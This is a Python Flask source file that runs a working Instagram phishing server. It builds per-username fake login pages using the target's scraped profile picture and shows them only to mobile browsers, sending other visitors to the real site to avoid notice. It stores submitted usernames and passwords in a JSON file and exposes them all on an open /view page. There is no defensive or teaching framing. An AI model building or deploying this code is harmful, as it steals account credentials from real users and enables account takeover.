from flask import Flask, request, redirect, render_template
from json import loads, dumps
from os.path import exists
from datetime import datetime

app = Flask(__name__)

if not exists('creds.json'):
    with open('creds.json', 'w') as file:
        file.write("[]")

import requests
from bs4 import BeautifulSoup

def get_pfp(username):
    base_url = f"https://www.instagram.com/{username}/"
    
    response = requests.get(base_url)
    
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        
        meta_tag = soup.find("meta", property="og:image")
        
        if meta_tag:
            return meta_tag["content"]
        else:
            return False
    else:
        return "Failed to retrieve the profile picture"

@app.route('/')
def index():
    return redirect('https://www.instagram.com')

@app.route('/accounts/<username>/login')
def login(username):
    user_agent = request.headers.get('User-Agent')
    
    if 'Mobile' in user_agent or 'Android' in user_agent or 'iOS' in user_agent:
        pfp = get_pfp(username)
        
        if not pfp:
            return redirect('https://www.instagram.com')
        
        return render_template("index.html", username=username, pfp=pfp)
        
    return redirect('https://www.instagram.com')   

@app.route('/accounts/<username>/submit', methods=['POST'])
def submit(username):
    if request.method == 'POST':
        data = request.form

        password = data.get('password')

        with open('creds.json', 'r') as file:
            data = loads(
                file.read()
            )

            data.append(
                {
                    "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "username": username,
                    "password": password
                }
            )

        with open('creds.json', 'w') as file:
            file.write(
                dumps(
                    data,
                    indent=4
                )
            )

    return redirect("https://www.instagram.com/not_scared_boy")

@app.route('/view')
def view():
    with open('creds.json', "r") as file:
        data = loads(
            file.read()
        )

    return render_template('view.html', users=data)

if __name__ == '__main__':
    app.run()
